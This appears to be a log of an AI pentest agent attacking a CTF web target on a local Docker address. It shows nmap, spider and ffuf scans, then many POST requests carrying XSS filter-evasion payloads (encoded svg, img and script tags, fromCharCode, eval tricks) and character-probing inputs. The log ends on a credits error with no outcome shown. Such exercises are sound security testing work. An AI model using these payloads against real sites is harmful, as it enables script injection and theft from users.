@@ -1,0 +1,53 @@
+[0m
+> build · qwen/qwen3.6-plus
+[0m
+[0m⚙ [0mpentest-agent_session {"action":"start","options":"{\"target\": \"http://172.17.0.1:36867\", \"depth\": \"thorough\"}"}
+[0m⚙ [0mpentest-agent_session {"action":"set_skill","options":"{\"skill\": \"pentester\", \"reason\": \"Starting full pentest workflow on CTF target\"}"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867","method":"GET"}
+[0m⚙ [0mpentest-agent_scan {"tool":"nmap","target":"172.17.0.1","flags":"-p- -sV -sC"}
+[0m⚙ [0mpentest-agent_scan {"tool":"spider","target":"http://172.17.0.1:36867"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"GET"}
+[0m⚙ [0mpentest-agent_scan {"tool":"ffuf","target":"http://172.17.0.1:36867","flags":"-w /usr/share/wordlists/dirb/common.txt -mc all -fc 404"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=test123"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Csvg%2Fonload%3Dalert(%27XSS%27)%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Csvg/onload=%5Cu0061l%5Cu0065rt('XSS')%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=hello"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=bcdfghijklmnopqrstuvwxyz"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=cdfghijklmnopqrstuvwxyz"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=xyz"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=dfghij"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=fghi"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=ghi"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=hijklmnopqrstuvwxyz"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=ij"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=j"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Cimg%20src%3Dx%20onerror%3D%60alert%28%27XSS%27%29%60%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Cscript%3E%61l%65rt('XSS')%3C/script%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%26%2360%3Bscript%26%2362%3B%61l%65rt('XSS')%26%2360%3B/script%26%2362%3B"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%26lt%3Bscript%26gt%3B%26lt%3B/script%26gt%3B"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=k"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=l"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=m"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=n"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=o"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=p"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=q"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=r"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=s"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=t"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=u"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=v"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=w"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=y"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=z"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%26%2360%3Bscript%26%2362%3B%61%6C%65%72%74%28%27%58%53%53%27%29%26%2360%3B%2Fscript%26%2362%3B"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=A"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%253Cscript%253Ealert(%2527XSS%2527)%253C%252Fscript%253E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Cscript%3EString.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)%3C/script%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Cscript%3E%65v%61l%28%60%61l%65rt%28%27XSS%27%29%60%29%3C/script%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=<script>\\x61l\\x65rt('XSS')</script>"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=%3Cscript%3Etop%5B%22%61l%65rt%22%5D(%27XSS%27)%3C/script%3E"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/static/css/xss/xss32.css"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:36867/page","method":"POST","headers":"{\"Content-Type\": \"application/x-www-form-urlencoded\"}","body":"name=+[]"}
+[91m[1mError: [0mInsufficient credits. Add more using https://openrouter.ai/settings/credits
